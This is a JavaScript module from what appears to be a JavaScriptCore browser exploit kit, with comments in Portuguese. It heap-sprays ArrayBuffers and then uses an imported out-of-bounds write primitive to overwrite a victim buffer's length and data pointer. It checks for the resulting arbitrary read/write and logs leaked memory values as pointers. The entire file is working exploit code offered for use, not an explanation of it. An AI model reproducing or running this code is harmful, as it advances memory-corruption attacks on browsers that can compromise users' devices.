// js/script3/testCorruptArrayBufferStructure.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, isAdvancedInt64Object, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive, oob_array_buffer_real,
    oob_write_absolute, oob_read_absolute, clearOOBEnvironment
} from '../core_exploit.mjs';
// OOB_CONFIG é importado, mas sua utilização para definir CORRUPTION_AB_CONFIG
// deve ser feita quando a função principal é chamada, não no escopo global do módulo.
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

// Mova a definição de CORRUPTION_AB_CONFIG para dentro da função principal
// ou crie uma função para obtê-la.

// Função auxiliar para pulverizar ArrayBuffers
function sprayArrayBuffers(count, size, logFn = logS3) {
    const sprayedAbs = [];
    logFn(`Pulverizando ${count} ArrayBuffers de ${size} bytes...`, "info", "sprayABs");
    for (let i = 0; i < count; i++) {
        try {
            sprayedAbs.push(new ArrayBuffer(size));
        } catch (e) {
            logFn(`Falha ao alocar ArrayBuffer de spray ${i + 1}/${count}: ${e.message}`, "warn", "sprayABs");
        }
    }
    logFn(`${sprayedAbs.length} ArrayBuffers pulverizados.`, sprayedAbs.length > 0 ? "good" : "warn", "sprayABs");
    return sprayedAbs;
}

// Esta função tentará usar um ArrayBuffer que teve seu tamanho corrompido
async function attemptReadWriteOnCorruptedBuffer(ab, originalSize, logFn = logS3, FNAME_PARENT = "") {
    logFn(` -> Tentando R/W no AB corrompido (tamanho original: ${originalSize}, atual: ${ab.byteLength})`, "info", FNAME_PARENT);
    try {
        const corruptedDv = new DataView(ab);
        const readOffsetBeyondOriginal = originalSize + 4; // Tentar ler/escrever um pouco além do limite original
        const testWriteVal = 0xABABABAB;

        if (readOffsetBeyondOriginal + 4 <= ab.byteLength) {
            logFn(`    Escrevendo ${toHex(testWriteVal)} em offset ${readOffsetBeyondOriginal}...`, "info", FNAME_PARENT);
            corruptedDv.setUint32(readOffsetBeyondOriginal, testWriteVal, true);
            const readBack = corruptedDv.getUint32(readOffsetBeyondOriginal, true);

            if (readBack === testWriteVal) {
                logFn(`    ---> LEITURA/ESCRITA ARBITRÁRIA (limitada ao novo tamanho) OBTIDA! Leu ${toHex(readBack)}`, "critical", FNAME_PARENT);
                if (readOffsetBeyondOriginal + 8 <= ab.byteLength) {
                    const potentialPtrLow = corruptedDv.getUint32(readOffsetBeyondOriginal, true);
                    const potentialPtrHigh = corruptedDv.getUint32(readOffsetBeyondOriginal + 4, true);
                    const ptr64 = new AdvancedInt64(potentialPtrLow, potentialPtrHigh);
                    logFn(`    Lido como U64 em ${readOffsetBeyondOriginal}: ${ptr64.toString(true)}`, "leak", FNAME_PARENT);
                }
                return true;
            } else {
                logFn(`    -> Falha na verificação R/W no AB corrompido (leu ${toHex(readBack)}, esperava ${toHex(testWriteVal)})`, "warn", FNAME_PARENT);
            }
        } else {
            logFn(`    -> Offset de teste R/W (${readOffsetBeyondOriginal}) está fora do novo tamanho do buffer (${ab.byteLength}).`, "warn", FNAME_PARENT);
        }
    } catch (e_rw) {
        logFn(`    -> Erro ao tentar R/W no AB corrompido: ${e_rw.message}`, "error", FNAME_PARENT);
    }
    return false;
}

const LONG_PAUSE_S3 = 2000; // Defina LONG_PAUSE_S3 se não estiver já em s3_utils.mjs

export async function testCorruptArrayBufferStructure() {
    const FNAME = "testCorruptArrayBufferStructure";

    // --- Parâmetros de Teste Configuráveis ---
    // Definir CORRUPTION_AB_CONFIG DENTRO da função para garantir que OOB_CONFIG esteja disponível.
    const CORRUPTION_AB_CONFIG = {
        spray_count: 200,
        victim_ab_size: 128,
        size_offset_in_object: parseInt(JSC_OFFSETS.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START, 16) || 0x18,
        vector_ptr_offset_in_object: parseInt(JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET, 16) || 0x10,
        corrupted_size_value: 0x7FFFFFF0,
        corrupted_vector_target_low: 0x0,
        corrupted_vector_target_high: 0x0,
        // Acessar OOB_CONFIG aqui é seguro pois a função é chamada depois da inicialização dos módulos.
        search_base_offset_start: (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 256,
        search_base_offset_end: (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) + (OOB_CONFIG.ALLOCATION_SIZE || 32768) + 256,
        search_step: 16,
        max_successful_corruptions_to_find: 1,
    };
    // --- Fim dos Parâmetros ---

    logS3(`--- Iniciando Teste de Corrupção de Estrutura de ArrayBuffer (S3) (v2.1) ---`, "test", FNAME);
    logS3(`   Configurações: Spray=${CORRUPTION_AB_CONFIG.spray_count}x${CORRUPTION_AB_CONFIG.victim_ab_size}B, ` +
          `SizeOffset=${toHex(CORRUPTION_AB_CONFIG.size_offset_in_object)}, VectorPtrOffset=${toHex(CORRUPTION_AB_CONFIG.vector_ptr_offset_in_object)}`, "info", FNAME);
    logS3(`   Range de Busca (base speculativa): ${toHex(CORRUPTION_AB_CONFIG.search_base_offset_start)} a ${toHex(CORRUPTION_AB_CONFIG.search_base_offset_end)}, Passo: ${CORRUPTION_AB_CONFIG.search_step}`, "info", FNAME);


    let successfulCorruptionsFound = 0;

    for (let attempt = 0; attempt < 3; attempt++) {
        if (successfulCorruptionsFound >= CORRUPTION_AB_CONFIG.max_successful_corruptions_to_find) break;

        logS3(`Tentativa de Corrupção de AB #${attempt + 1}...`, "test", FNAME);
        // Certifique-se que updateOOBConfigFromUI é chamado dentro de triggerOOB_primitive ou antes,
        // se os valores de OOB_CONFIG podem mudar dinamicamente pela UI.
        // A importação de OOB_CONFIG já traz os valores default ou os atualizados se updateOOBConfigFromUI
        // já foi chamado no fluxo de inicialização do core_exploit.
        await triggerOOB_primitive();
        if (!oob_array_buffer_real) {
            logS3("Falha ao configurar ambiente OOB. Abortando esta tentativa.", "error", FNAME);
            continue;
        }

        const victimAbs = sprayArrayBuffers(CORRUPTION_AB_CONFIG.spray_count, CORRUPTION_AB_CONFIG.victim_ab_size, logS3);
        if (victimAbs.length === 0) {
            clearOOBEnvironment();
            continue;
        }
        await PAUSE_S3(MEDIUM_PAUSE_S3);

        for (let baseCandidateOffset = CORRUPTION_AB_CONFIG.search_base_offset_start;
             baseCandidateOffset < CORRUPTION_AB_CONFIG.search_base_offset_end;
             baseCandidateOffset += CORRUPTION_AB_CONFIG.search_step) {

            if (successfulCorruptionsFound >= CORRUPTION_AB_CONFIG.max_successful_corruptions_to_find) break;

            if (baseCandidateOffset < 0 || baseCandidateOffset >= oob_array_buffer_real.byteLength) continue;

            const absOffsetForVictimSize = baseCandidateOffset + CORRUPTION_AB_CONFIG.size_offset_in_object;
            const absOffsetForVictimVectorPtr = baseCandidateOffset + CORRUPTION_AB_CONFIG.vector_ptr_offset_in_object;

            let willAttemptWriteSize = (absOffsetForVictimSize >= 0 && absOffsetForVictimSize + 4 <= oob_array_buffer_real.byteLength);
            let willAttemptWriteVector = (absOffsetForVictimVectorPtr >= 0 && absOffsetForVictimVectorPtr + 8 <= oob_array_buffer_real.byteLength);

            if (!willAttemptWriteSize && !willAttemptWriteVector) {
                continue;
            }
            logS3(` Testando base especulativa ${toHex(baseCandidateOffset)} para um ArrayBuffer...`, "info", FNAME);

            if (willAttemptWriteSize) {
                const originalValueAtSizeOffset = oob_read_absolute(absOffsetForVictimSize, 4);
                logS3(`  -> Escrevendo tamanho ${toHex(CORRUPTION_AB_CONFIG.corrupted_size_value)} em abs offset ${toHex(absOffsetForVictimSize)} (Original: ${toHex(originalValueAtSizeOffset)})`, "info", FNAME);
                oob_write_absolute(absOffsetForVictimSize, CORRUPTION_AB_CONFIG.corrupted_size_value, 4);

                for (let i = 0; i < victimAbs.length; i++) {
                    if (!victimAbs[i]) continue;
                    try {
                        if (victimAbs[i].byteLength === CORRUPTION_AB_CONFIG.corrupted_size_value) {
                            logS3(`  !!! SUCESSO DE CORRUPÇÃO DE TAMANHO !!! ArrayBuffer pulverizado ${i} teve byteLength alterado para ${toHex(victimAbs[i].byteLength)}!`, "vuln", FNAME);
                            logS3(`     Offset base do objeto vítima (especulativo): ${toHex(baseCandidateOffset)}`, "vuln", FNAME);
                            logS3(`     Offset absoluto do campo de tamanho corrompido: ${toHex(absOffsetForVictimSize)}`, "vuln", FNAME);
                            if (await attemptReadWriteOnCorruptedBuffer(victimAbs[i], CORRUPTION_AB_CONFIG.victim_ab_size, logS3, FNAME)) {
                                successfulCorruptionsFound++;
                                if (successfulCorruptionsFound >= CORRUPTION_AB_CONFIG.max_successful_corruptions_to_find) break;
                            }
                        }
                    } catch (e_check) { /* Erro ao acessar byteLength pode acontecer se o objeto estiver muito corrompido */ }
                }
                 // Restaurar (idealmente): oob_write_absolute(absOffsetForVictimSize, originalValueAtSizeOffset, 4);
            }
            if (successfulCorruptionsFound >= CORRUPTION_AB_CONFIG.max_successful_corruptions_to_find) break;
            await PAUSE_S3(SHORT_PAUSE_S3);

            if (willAttemptWriteVector) {
                const originalVectorPtr = oob_read_absolute(absOffsetForVictimVectorPtr, 8);
                const newVectorPtr = new AdvancedInt64(CORRUPTION_AB_CONFIG.corrupted_vector_target_low, CORRUPTION_AB_CONFIG.corrupted_vector_target_high);
                logS3(`  -> Escrevendo ponteiro de vetor ${newVectorPtr.toString(true)} em abs offset ${toHex(absOffsetForVictimVectorPtr)} (Original: ${isAdvancedInt64Object(originalVectorPtr) ? originalVectorPtr.toString(true) : toHex(originalVectorPtr)})`, "info", FNAME);
                oob_write_absolute(absOffsetForVictimVectorPtr, newVectorPtr, 8);

                for (let i = 0; i < victimAbs.length; i++) {
                    if (!victimAbs[i]) continue;
                    try {
                        const dvCheck = new DataView(victimAbs[i]);
                        const firstByte = dvCheck.getUint8(0); // Tenta ler
                        logS3(`  AB ${i} após corrupção de vetor: byteLength=${victimAbs[i].byteLength}, 1stByte lido=${toHex(firstByte, 8)}.`, "info", FNAME);
                    } catch (e_check_vec) {
                        logS3(`  !!! POTENCIAL UAF/CORRUPÇÃO DE VETOR !!! Erro ao acessar AB ${i} após corrupção de vetor: ${e_check_vec.message}`, "critical", FNAME);
                        logS3(`     Offset base do objeto vítima (especulativo): ${toHex(baseCandidateOffset)}`, "vuln", FNAME);
                        logS3(`     Offset absoluto do campo de vetor corrompido: ${toHex(absOffsetForVictimVectorPtr)}`, "vuln", FNAME);
                        successfulCorruptionsFound++;
                        if (successfulCorruptionsFound >= CORRUPTION_AB_CONFIG.max_successful_corruptions_to_find) break;
                    }
                }
                // Restaurar (idealmente): oob_write_absolute(absOffsetForVictimVectorPtr, originalVectorPtr, 8);
            }
             if (successfulCorruptionsFound >= CORRUPTION_AB_CONFIG.max_successful_corruptions_to_find) break;
        }
        clearOOBEnvironment();
        if (successfulCorruptionsFound >= CORRUPTION_AB_CONFIG.max_successful_corruptions_to_find) break;
        await PAUSE_S3(LONG_PAUSE_S3);
    }

    logS3(`--- Teste de Corrupção de Estrutura de ArrayBuffer Concluído (Sucessos de Corrupção Encontrados: ${successfulCorruptionsFound}) ---`, "test", FNAME);
}
